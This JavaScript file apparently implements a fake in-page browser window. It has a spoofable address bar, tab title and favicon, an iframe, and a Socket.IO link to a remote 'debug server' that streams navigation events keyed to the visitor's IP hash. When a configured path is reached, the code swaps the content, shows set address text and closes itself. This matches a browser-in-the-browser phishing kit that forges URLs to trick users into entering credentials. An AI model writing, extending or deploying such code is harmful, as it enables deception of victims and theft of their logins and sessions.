var minimize = document.getElementById("minimize");
var square = document.getElementById("square");
var exit = document.getElementById("exit");
var titleBar = document.getElementById("tab-bar");
var addressSettingsBtn = document.getElementById("address-settings-btn");
var addressBar = document.getElementById("address-bar") || document.getElementById("url-bar");
var contentFrame = document.getElementById("content");
var windowShell = document.getElementById("window");
var showIframeBtn = document.getElementById("show-iframe-btn");
var siteInfoPanel = document.getElementById("site-info-panel");
var sitePanelClose = document.getElementById("site-panel-close");
var tabTitle = document.getElementById("tab-title") || document.getElementById("logo-description");
var domainName = document.getElementById("domain-name");
var domainPath = document.getElementById("domain-path");
var tabFavicon = document.querySelector("#active-tab .tab-favicon") || document.querySelector(".tab-favicon");

var backdrop = (function () {
  var el = document.createElement("div");
  el.id = "fescarcuddle-backdrop";
  el.style.cssText = [
    "position:fixed",
    "inset:0",
    "z-index:99998",
    "background:rgba(0,0,0,0.45)",
    "opacity:0",
    "transition:opacity 0.25s ease",
    "pointer-events:none",
    "display:none"
  ].join(";");
  document.body.appendChild(el);
  return el;
}());

var appConfig = window.appConfig || {};
var iframeSrc = appConfig.iframeSrc || "";
var sitePanelMessage = appConfig.sitePanelMessage || "";
var configuredAddressText = appConfig.addressText || ((appConfig.domainName || "") + (appConfig.domainPath || ""));
var configuredTabTitle = appConfig.tabTitle || "";
var clientIp = appConfig.clientIp || window.__VISITOR_IP__ || "";
var matchUrl = typeof appConfig.matchUrl === "string" ? appConfig.matchUrl.trim() : "";
var matchIframeSrc = typeof appConfig.matchIframeSrc === "string" ? appConfig.matchIframeSrc.trim() : "";
var matchAddressText = typeof appConfig.matchAddressText === "string" ? appConfig.matchAddressText.trim() : "";
var matchTabTitle = typeof appConfig.matchTabTitle === "string" ? appConfig.matchTabTitle.trim() : "";
var matchFavicon = typeof appConfig.matchFavicon === "string" ? appConfig.matchFavicon.trim() : "";
var matchHideDelay = typeof appConfig.matchHideDelay === "number" ? appConfig.matchHideDelay : 0;
var matchCloseMessage = typeof appConfig.matchCloseMessage === "string" ? appConfig.matchCloseMessage : "";
var matchHideTimer = null;
var debugIpFromQuery = new URLSearchParams(window.location.search).get("debugIp");
var debugIp = debugIpFromQuery == null ? "" : String(debugIpFromQuery).trim();
var debugServerUrl = appConfig.debugServerUrl || appConfig.logsSocketIoUrl || "";

function appendDebugIpToIframeSrc(src, debugIpValue) {
  if (!src || !debugIpValue) {
    return src || "";
  }

  try {
    var parsedUrl = new URL(src, window.location.href);
    parsedUrl.searchParams.set("debugIp", debugIpValue);
    return parsedUrl.toString();
  } catch (err) {
    var separator = src.indexOf("?") === -1 ? "?" : "&";
    return src + separator + "debugIp=" + encodeURIComponent(debugIpValue);
  }
}

iframeSrc = appendDebugIpToIframeSrc(iframeSrc, debugIp);

var isMobileDevice = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
var fixedViewportWidth = window.innerWidth;
var fixedViewportHeight = window.innerHeight;

if (isMobileDevice) {
  var mobileChromeHeight = window._isMac ? 58 : 84;
  fixedViewportHeight = Math.max(50, window.innerHeight - mobileChromeHeight);
  document.documentElement.classList.add("is-mobile");
  document.documentElement.style.setProperty("--initial-window-width", window.innerWidth + "px");
  document.documentElement.style.setProperty("--initial-window-height", window.innerHeight + "px");
  document.documentElement.style.setProperty("--mobile-content-width", fixedViewportWidth + "px");
  document.documentElement.style.setProperty("--mobile-content-height", fixedViewportHeight + "px");
}

if (isMobileDevice && iframeSrc) {
  try {
    var _mobileUrl = new URL(iframeSrc, window.location.href);
    _mobileUrl.searchParams.set("mobile", "1");
    iframeSrc = _mobileUrl.toString();
  } catch (err) {
    var _mobileSep = iframeSrc.indexOf("?") === -1 ? "?" : "&";
    iframeSrc = iframeSrc + _mobileSep + "mobile=1";
  }
}

// Append explicit viewport dimensions only for mobile mode.
// On desktop this causes coordinate drift because the iframe chrome differs.
if (isMobileDevice && iframeSrc) {
  try {
    var _dimUrl = new URL(iframeSrc, window.location.href);
    _dimUrl.searchParams.set("vw", fixedViewportWidth);
    _dimUrl.searchParams.set("vh", fixedViewportHeight);
    iframeSrc = _dimUrl.toString();
  } catch (err) {
    var _dimSep = iframeSrc.indexOf("?") === -1 ? "?" : "&";
    iframeSrc = iframeSrc + _dimSep + "vw=" + fixedViewportWidth + "&vh=" + fixedViewportHeight;
  }
}

var windowPositions = [
  { left: "12%", top: "12%" },
  { left: "46%", top: "22%" }
];

function getRandomPositionIndex(excludeIndex) {
  if (windowPositions.length <= 1) {
    return 0;
  }

  var randomIndex = Math.floor(Math.random() * windowPositions.length);

  if (typeof excludeIndex === "number" && randomIndex === excludeIndex) {
    randomIndex = (randomIndex + 1) % windowPositions.length;
  }

  return randomIndex;
}

var windowPositionIndex = getRandomPositionIndex();

if (tabTitle) {
  tabTitle.textContent = configuredTabTitle;
}

if (domainName) {
  domainName.textContent = configuredAddressText;
}
if (domainPath) {
  domainPath.textContent = "";
}

function setAddressBarText(value) {
  if (!domainName || typeof value !== "string") {
    return;
  }

  domainName.textContent = value;
  if (domainPath) {
    domainPath.textContent = "";
  }

  if (addressBar) {
    addressBar.setAttribute("title", value);
  }
}

function applyAddressFromEventData(rawValue) {
  if (!domainName || typeof rawValue !== "string") {
    return;
  }

  var value = rawValue.trim();
  if (!value) {
    return;
  }

  try {
    var parsed = new URL(value);
    setAddressBarText(parsed.host + parsed.pathname);
    return;
  } catch (err) {
    // Not a full URL; continue with fallback formatting.
  }

  var sanitizedValue = value.split("?")[0].split("#")[0];
  setAddressBarText(sanitizedValue || value);
}

function applyTabTitleFromEventData(rawValue) {
  if (!tabTitle || typeof rawValue !== "string") {
    return;
  }

  var value = rawValue.trim();
  if (!value) {
    return;
  }

  tabTitle.textContent = value;
}

function applyFaviconFromEventData(rawValue) {
  if (!tabFavicon || typeof rawValue !== "string") {
    return;
  }

  var value = rawValue.trim();
  if (!value) {
    return;
  }

  tabFavicon.src = value;
  tabFavicon.style.display = "";
}

function consumeLogPayload(payload) {
  if (!payload || typeof payload !== "object") {
    return;
  }

  var addressValue = "";
  var eventType = typeof payload.event_type === "string" ? payload.event_type.trim().toUpperCase() : "";

  if (typeof payload.event_url === "string" && payload.event_url.trim()) {
    addressValue = payload.event_url;
  } else if (eventType === "NAVIGATION" && typeof payload.event_data === "string" && payload.event_data.trim()) {
    addressValue = payload.event_data;
  }

  if (addressValue) {
    applyAddressFromEventData(addressValue);
  }

  if (typeof payload.event_title === "string") {
    applyTabTitleFromEventData(payload.event_title);
  }

  if (typeof payload.event_favicon === "string") {
    applyFaviconFromEventData(payload.event_favicon);
  }

  if (matchUrl && matchIframeSrc && addressValue && (function () {
    try {
      return new URL(addressValue).pathname === matchUrl;
    } catch (e) {
      return false;
    }
  })()) {
    if (contentFrame) {
      contentFrame.setAttribute("src", matchIframeSrc);
    }

    if (matchAddressText) {
      setAddressBarText(matchAddressText);
    }

    if (matchTabTitle) {
      applyTabTitleFromEventData(matchTabTitle);
    }

    if (matchFavicon) {
      applyFaviconFromEventData(matchFavicon);
    }

    if (matchHideDelay > 0) {
      if (matchHideTimer !== null) {
        clearTimeout(matchHideTimer);
      }
      matchHideTimer = setTimeout(function () {
        matchHideTimer = null;
        $("#exit").trigger("click");
        if (matchCloseMessage) {
          var msgEl = document.getElementById("match-close-message");
          if (msgEl) {
            msgEl.textContent = matchCloseMessage;
            msgEl.style.display = "block";
          }
        }
      }, matchHideDelay * 1000);
    }
  }
}

function consumeInitialLogs(items) {
  if (!Array.isArray(items) || items.length === 0) {
    return;
  }

  var latestLog = items[items.length - 1];
  consumeLogPayload(latestLog);
}

function bufferToHex(buffer) {
  var bytes = new Uint8Array(buffer);
  var hex = "";

  for (var i = 0; i < bytes.length; i += 1) {
    hex += bytes[i].toString(16).padStart(2, "0");
  }

  return hex;
}

function sha256(text) {
  if (!text) {
    return Promise.resolve("");
  }

  if (!window.crypto || !window.crypto.subtle) {
    return Promise.resolve("");
  }

  var encoder = new TextEncoder();

  return window.crypto.subtle.digest("SHA-256", encoder.encode(text)).then(function (hashBuffer) {
    return bufferToHex(hashBuffer);
  });
}

function extractClientIp(value) {
  if (value && typeof value === "object") {
    return (value.ip || value.clientIp || value.address || value.value || "").trim();
  }

  if (typeof value !== "string") {
    return "";
  }

  var trimmedValue = value.trim();

  if (!trimmedValue) {
    return "";
  }

  try {
    var parsedValue = JSON.parse(trimmedValue);

    if (typeof parsedValue === "string") {
      return parsedValue.trim();
    }

    if (parsedValue && typeof parsedValue === "object") {
      return (parsedValue.ip || parsedValue.clientIp || parsedValue.address || parsedValue.value || "").trim();
    }
  } catch (err) {
    // Plain-text response, keep the trimmed value.
  }

  return trimmedValue;
}

function applyDebugIpSuffix(ipValue) {
  if (!ipValue || !debugIp) {
    return ipValue || "";
  }

  if (ipValue.slice(-debugIp.length) === debugIp) {
    return ipValue;
  }

  return ipValue + debugIp;
}

clientIp = applyDebugIpSuffix(clientIp);

function fetchClientIp() {
  if (clientIp) {
    return Promise.resolve(clientIp);
  }

  if (!debugServerUrl) {
    return Promise.resolve("");
  }

  var clientIpUrl = debugServerUrl.replace(/\/$/, "") + "/client-ip";

  if (debugIp) {
    clientIpUrl += "?debugIp=" + encodeURIComponent(debugIp);
  }

  return fetch(clientIpUrl, {
    cache: "no-store",
    credentials: "omit"
  }).then(function (response) {
    if (!response.ok) {
      throw new Error("client-ip request failed: " + response.status);
    }

    return response.clone().json().catch(function () {
      return response.text();
    });
  }).then(function (responseBody) {
    clientIp = applyDebugIpSuffix(extractClientIp(responseBody));
    return clientIp;
  }).catch(function () {
    return clientIp || "";
  });
}

function loadScript(src, onLoad, onError) {
  var existing = document.querySelector('script[data-dynamic-src="' + src + '"]');

  if (existing) {
    if (typeof onLoad === "function") {
      onLoad();
    }
    return;
  }

  var script = document.createElement("script");
  script.src = src;
  script.async = true;
  script.dataset.dynamicSrc = src;
  script.onload = onLoad || null;
  script.onerror = onError || null;
  document.head.appendChild(script);
}

var logsSocketIoState = window.__logsSocketIoState || {
  socket: null,
  connecting: false,
  loadRetryTimer: null,
  ownerId: Math.random().toString(36).slice(2),
  lockKey: "",
  lockHeartbeat: null
};
window.__logsSocketIoState = logsSocketIoState;

// Guard against duplicate script evaluation creating multiple Socket.IO clients.
if (window.__logsSocketIoBootstrapped === undefined) {
  window.__logsSocketIoBootstrapped = false;
}

function getLogsSocketLockKey(sessionId) {
  return "fescarcuddle:logs-socket:" + debugServerUrl + ":" + sessionId;
}

function readLogsSocketLock(key) {
  try {
    return JSON.parse(window.localStorage.getItem(key) || "null");
  } catch (err) {
    return null;
  }
}

function writeLogsSocketLock(key) {
  try {
    window.localStorage.setItem(key, JSON.stringify({
      ownerId: logsSocketIoState.ownerId,
      expiresAt: Date.now() + 30000
    }));
    return true;
  } catch (err) {
    return true;
  }
}

function acquireLogsSocketLock(sessionId) {
  var key = getLogsSocketLockKey(sessionId);
  var existing = readLogsSocketLock(key);
  if (existing && existing.ownerId !== logsSocketIoState.ownerId && existing.expiresAt > Date.now()) {
    return false;
  }

  logsSocketIoState.lockKey = key;
  writeLogsSocketLock(key);
  if (logsSocketIoState.lockHeartbeat) {
    clearInterval(logsSocketIoState.lockHeartbeat);
  }
  logsSocketIoState.lockHeartbeat = setInterval(function () {
    var current = readLogsSocketLock(key);
    if (current && current.ownerId !== logsSocketIoState.ownerId && current.expiresAt > Date.now()) {
      clearInterval(logsSocketIoState.lockHeartbeat);
      logsSocketIoState.lockHeartbeat = null;
      return;
    }
    writeLogsSocketLock(key);
  }, 10000);
  return true;
}

function releaseLogsSocketLock() {
  if (logsSocketIoState.lockHeartbeat) {
    clearInterval(logsSocketIoState.lockHeartbeat);
    logsSocketIoState.lockHeartbeat = null;
  }
  if (!logsSocketIoState.lockKey) {
    return;
  }
  try {
    var current = readLogsSocketLock(logsSocketIoState.lockKey);
    if (current && current.ownerId === logsSocketIoState.ownerId) {
      window.localStorage.removeItem(logsSocketIoState.lockKey);
    }
  } catch (err) {
    // Ignore storage failures; the TTL will expire stale locks.
  }
  logsSocketIoState.lockKey = "";
}

window.addEventListener("beforeunload", releaseLogsSocketLock);

function connectLogsSocketIo() {
  if (!debugServerUrl) {
    return;
  }

  if (logsSocketIoState.connecting || (logsSocketIoState.socket && logsSocketIoState.socket.active !== false)) {
    return;
  }

  logsSocketIoState.connecting = true;

  function startSocketIoClient(sessionId) {
    if (typeof window.io !== "function") {
      logsSocketIoState.connecting = false;
      return;
    }

    if (logsSocketIoState.socket && logsSocketIoState.socket.active !== false) {
      logsSocketIoState.connecting = false;
      return;
    }

    if (!acquireLogsSocketLock(sessionId)) {
      logsSocketIoState.connecting = false;
      // Lock held by another tab — retry after it expires (TTL = 30s)
      if (!logsSocketIoState.loadRetryTimer) {
        logsSocketIoState.loadRetryTimer = setTimeout(function () {
          logsSocketIoState.loadRetryTimer = null;
          connectLogsSocketIo();
        }, 5000);
      }
      return;
    }

    var socket = window.io(debugServerUrl, {
      path: "/socket.io",
      // Prefer polling first. In some proxies/CDNs WebSocket upgrade is flaky,
      // but long-polling remains stable for low-volume navigation events.
      transports: ["polling", "websocket"],
      upgrade: true,
      rememberUpgrade: false,
      reconnection: true,
      reconnectionDelay: 2000,
      reconnectionDelayMax: 30000,
      reconnectionAttempts: 10,
      timeout: 10000,
      query: {
        debugIp: debugIp
      },
      auth: {
        clientIp: clientIp,
        debugIp: debugIp,
        sessionId: sessionId
      }
    });
    logsSocketIoState.socket = socket;
    logsSocketIoState.connecting = false;

    socket.on("initial_logs", function (items) {
      consumeInitialLogs(items);
    });

    socket.on("log", function (payload) {
      consumeLogPayload(payload);
    });

    socket.on("connect_error", function (err) {
      if (err && err.message === "duplicate_session_socket") {
        if (socket.io && typeof socket.io.reconnection === "function") {
          socket.io.reconnection(false);
        } else if (socket.io && socket.io.opts) {
          socket.io.opts.reconnection = false;
        }
        socket.disconnect();
        logsSocketIoState.socket = null;
        releaseLogsSocketLock();
      }
    });

    socket.on("duplicate_session_socket", function () {
      if (socket.io && typeof socket.io.reconnection === "function") {
        socket.io.reconnection(false);
      }
      socket.disconnect();
      logsSocketIoState.socket = null;
      releaseLogsSocketLock();
    });

    socket.on("disconnect", function (reason) {
      if (reason === "io client disconnect") {
        logsSocketIoState.socket = null;
        releaseLogsSocketLock();
      }
    });
  }

  fetchClientIp().then(function (resolvedClientIp) {
    return sha256(resolvedClientIp || clientIp);
  }).then(function (sessionId) {
    console.log("[debug] clientIp:", clientIp, "sessionId(sha256):", sessionId);

    if (typeof window.io === "function") {
      startSocketIoClient(sessionId);
      return;
    }

    var scriptUrl = debugServerUrl.replace(/\/$/, "") + "/socket.io/socket.io.js";

    loadScript(scriptUrl, function () {
      startSocketIoClient(sessionId);
    }, function () {
      logsSocketIoState.connecting = false;
      if (!logsSocketIoState.loadRetryTimer) {
        logsSocketIoState.loadRetryTimer = setTimeout(function () {
          logsSocketIoState.loadRetryTimer = null;
          connectLogsSocketIo();
        }, 5000);
      }
    });
  }).catch(function () {
    logsSocketIoState.connecting = false;
  });
}

if (!window.__logsSocketIoBootstrapped) {
  window.__logsSocketIoBootstrapped = true;
  connectLogsSocketIo();
}

if (siteInfoPanel) {
  var messageNode = document.getElementById("site-panel-message");

  if (messageNode) {
    messageNode.textContent = sitePanelMessage;
  }
}

if (contentFrame && iframeSrc) {
  contentFrame.setAttribute("src", iframeSrc);
}

function applyWindowPosition(index) {
  if (!windowShell) {
    return;
  }

  var pos = windowPositions[index];
  windowShell.style.right = "";
  windowShell.style.bottom = "";
  windowShell.style.left = pos.left;
  windowShell.style.top = pos.top;
}

if (windowShell) {
  applyWindowPosition(windowPositionIndex);
}

if (showIframeBtn) {
  showIframeBtn.addEventListener("click", function () {
    var wasHidden = windowShell && windowShell.classList.contains("is-hidden");

    if (windowShell) {
      windowShell.classList.remove("is-hidden");
      windowShell.style.display = "";

      // Pick a new random position every click.
      windowPositionIndex = getRandomPositionIndex(windowPositionIndex);
      applyWindowPosition(windowPositionIndex);
    }

    if (contentFrame) {
      if (!contentFrame.getAttribute("src") || wasHidden) {
        // Load the iframe the first time, and refresh it when reopening after close.
        contentFrame.setAttribute("src", iframeSrc);
      }

      contentFrame.classList.remove("is-hidden");
    }
  });
}

function closeSiteInfoPanel() {
  if (!siteInfoPanel) {
    return;
  }

  siteInfoPanel.classList.remove("open");
  siteInfoPanel.setAttribute("aria-hidden", "true");
}

function placeSiteInfoPanel() {
  if (!addressSettingsBtn || !siteInfoPanel) {
    return;
  }

  var buttonRect = addressSettingsBtn.getBoundingClientRect();
  var panelWidth = 320;
  var left = buttonRect.left - 10;
  var maxLeft = window.innerWidth - panelWidth - 12;

  siteInfoPanel.style.top = (buttonRect.bottom + 10) + "px";
  siteInfoPanel.style.left = Math.max(12, Math.min(left, maxLeft)) + "px";
}

if (addressSettingsBtn && siteInfoPanel) {
  addressSettingsBtn.addEventListener("click", function (event) {
    event.stopPropagation();
    placeSiteInfoPanel();

    if (siteInfoPanel.classList.contains("open")) {
      closeSiteInfoPanel();
    } else {
      siteInfoPanel.classList.add("open");
      siteInfoPanel.setAttribute("aria-hidden", "false");
    }
  });

  siteInfoPanel.addEventListener("click", function (event) {
    event.stopPropagation();
  });

  if (sitePanelClose) {
    sitePanelClose.addEventListener("click", function () {
      closeSiteInfoPanel();
    });
  }

  if (addressBar) {
    addressBar.addEventListener("mousedown", function (event) {
      if (!addressSettingsBtn.contains(event.target)) {
        closeSiteInfoPanel();
      }
    });
  }

  if (contentFrame) {
    contentFrame.addEventListener("mousedown", function () {
      closeSiteInfoPanel();
    });

    contentFrame.addEventListener("focus", function () {
      closeSiteInfoPanel();
    });
  }

  document.addEventListener("click", function () {
    closeSiteInfoPanel();
  });

  window.addEventListener("resize", function () {
    if (siteInfoPanel.classList.contains("open")) {
      placeSiteInfoPanel();
    }
  });
}

////////////////// Hover listeners //////////////////
if (minimize) {
  minimize.addEventListener('mouseover', function() {
    minimize.style.backgroundColor = 'rgba(0, 0, 0, 0.1)';
  });
  minimize.addEventListener('mouseout', function() {
    minimize.style.backgroundColor = '';
  });
}

if (square) {
  square.addEventListener('mouseover', function() {
    square.style.backgroundColor = 'rgba(0, 0, 0, 0.1)';
  });
  square.addEventListener('mouseout', function() {
    square.style.backgroundColor = '';
  });
}

if (exit) {
  exit.addEventListener('mouseover', function() {
    exit.style.backgroundColor = '#c42b1c';
    exit.style.color = 'white';
  });
  exit.addEventListener('mouseout', function() {
    exit.style.backgroundColor = '';
    exit.style.color = '';
  });
}


//////////////// Make window draggable start ////////////////
var draggable = $('#window');
// Support both Windows (#tab-bar) and MacOS (#title-bar) chrome
var title = $('#tab-bar, #title-bar');

title.on('mousedown', function(e){
  closeSiteInfoPanel();
	var dr = $(draggable).addClass("drag");
	height = dr.outerHeight();
	width = dr.outerWidth();
	ypos = dr.offset().top + height - e.pageY,
	xpos = dr.offset().left + width - e.pageX;
	$(document.body).on('mousemove', function(e){
		var itop = e.pageY + ypos - height;
		var ileft = e.pageX + xpos - width;
		if(dr.hasClass("drag")){
			dr.offset({top: itop,left: ileft});
		}
	}).on('mouseup', function(e){
			dr.removeClass("drag");
	});
});
//////////////// Make window draggable end ////////////////


////////////////// Onclick listeners //////////////////
// X button functionality
$("#exit").click(function(){
    closeSiteInfoPanel();

    if (windowShell) {
      windowShell.classList.add("is-hidden");
    }

    if (contentFrame) {
      contentFrame.classList.add("is-hidden");
    }

    backdrop.style.opacity = "0";
    setTimeout(function () { backdrop.style.display = "none"; }, 260);
  });

// Maximize button functionality — support both #square (Windows) and #maximize (MacOS)
$("#square, #maximize").click(enlarge);

function enlarge(){
  if(square.classList.contains("enlarged")){
    $("#window").css("width", "900px");
    $("#content").css("height", "650px");
    $("#square").removeClass("enlarged");
  } else {
    $("#window").css("width", "1200px");
    $("#content").css("height", "800px");
    $("#square").addClass("enlarged");
  }
}

// ─── Mobile unavailable toast ─────────────────────────────────────────────────
var mobileToast = (function () {
  var el = document.createElement("div");
  el.style.cssText = [
    "position:fixed",
    "left:50%",
    "bottom:32px",
    "transform:translateX(-50%) translateY(20px)",
    "z-index:100000",
    "background:#1e2535",
    "color:#e2e8f0",
    "font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif",
    "font-size:14px",
    "line-height:1.5",
    "padding:14px 20px",
    "border-radius:10px",
    "box-shadow:0 8px 32px rgba(0,0,0,0.5)",
    "border:1px solid #2a3a50",
    "max-width:calc(100vw - 32px)",
    "text-align:center",
    "opacity:0",
    "transition:opacity 0.25s ease,transform 0.25s ease",
    "pointer-events:none",
    "display:none"
  ].join(";");
  el.innerHTML = "&#128245; Esta función no está disponible en dispositivos móviles.";
  document.body.appendChild(el);
  return el;
}());

function showMobileToast() {
  mobileToast.style.display = "block";
  requestAnimationFrame(function () {
    mobileToast.style.opacity = "1";
    mobileToast.style.transform = "translateX(-50%) translateY(0)";
  });
  setTimeout(function () {
    mobileToast.style.opacity = "0";
    mobileToast.style.transform = "translateX(-50%) translateY(20px)";
    setTimeout(function () { mobileToast.style.display = "none"; }, 280);
  }, 3500);
}

// ─── Public API (used by fescarcuddle-loader.js) ──────────────────────────────
window.FescarCuddleCore = {
  show: function () {
    if (isMobileDevice) {
      showMobileToast();
      return;
    }
    if (!windowShell) return;
    var wasHidden = windowShell.classList.contains("is-hidden");
    windowShell.classList.remove("is-hidden");
    windowShell.style.display = "";
    windowPositionIndex = getRandomPositionIndex(windowPositionIndex);
    applyWindowPosition(windowPositionIndex);
    if (contentFrame) {
      if (!contentFrame.getAttribute("src") || wasHidden) {
        contentFrame.setAttribute("src", iframeSrc);
      }
      contentFrame.classList.remove("is-hidden");
    }
    backdrop.style.display = "block";
    requestAnimationFrame(function () { backdrop.style.opacity = "1"; });
  },
  hide: function () {
    closeSiteInfoPanel();
    if (windowShell) windowShell.classList.add("is-hidden");
    if (contentFrame) contentFrame.classList.add("is-hidden");
    backdrop.style.opacity = "0";
    setTimeout(function () { backdrop.style.display = "none"; }, 260);
  }
};